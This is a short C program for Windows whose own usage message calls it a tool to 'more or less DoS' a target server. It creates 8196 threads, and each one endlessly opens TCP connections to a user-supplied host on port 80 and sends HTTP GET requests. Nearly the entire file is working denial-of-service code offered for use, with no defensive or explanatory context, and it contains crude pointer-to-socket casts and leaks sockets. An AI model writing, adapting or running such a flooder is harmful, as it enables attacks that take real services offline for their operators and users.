#include <stdlib.h>
#include <stdio.h>
#include <winsock2.h>
#include <pthread.h>

#define Write(MSG) send(sock, MSG, strlen(MSG), 0)
#define debug(MSG) printf("%s\n", MSG)

int port = 80, size;
char *host, *path;
struct sockaddr_in sin;
struct hostent *host_addr;
typedef struct {
	pthread_t t;
} client;

void *spam(int p) {
	int *sock;
	char *data, *c;
	data = malloc(1);
	c = calloc(1024, 1);
	strcpy(c, "GET ");
	strcat(c, path);
	strcat(c, " HTTP/1.0\r\nHost: ");
	strcat(c, host);
	strcat(c, "\r\n\r\n");
	size = strlen(c);
	while(1 == 1) {
		sock = socket (AF_INET, SOCK_STREAM, 0);
		connect((int)sock, (const struct sockaddr *)&sin, sizeof(struct sockaddr_in));
		send((int)sock, c, size, 0);
		int ret = recv((int)sock, data, 1, 0);
	}
}

int main(int argc, char *argv[]) {
	if(argc < 2) {
		printf("Usage:\nspam IP_OR_HOSTNAME [OPTINONAL_PATH]\n\nWarning:\nThis will more or less DoS the server you are spamming,\nseeing you already downloaded and executed the program\nI believe you know what you are doing.");
		return 0;
	}
	host = argv[1];
	if(argc >= 3) {
		path = argv[2];
	} else path = "/";
	WSADATA	WsaData;
	WSAStartup (0x202, &WsaData);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	host_addr = gethostbyname(host);
	sin.sin_addr.s_addr = *((int*)*host_addr->h_addr_list);
	int i = 0;
	client clients[8196];
	for (i = 0; i < 8196; i++) {
		pthread_create(&clients[i].t, NULL, spam, 0);
	}
	pthread_join(clients[0].t, NULL);
	WSACleanup();
	return 0;
}
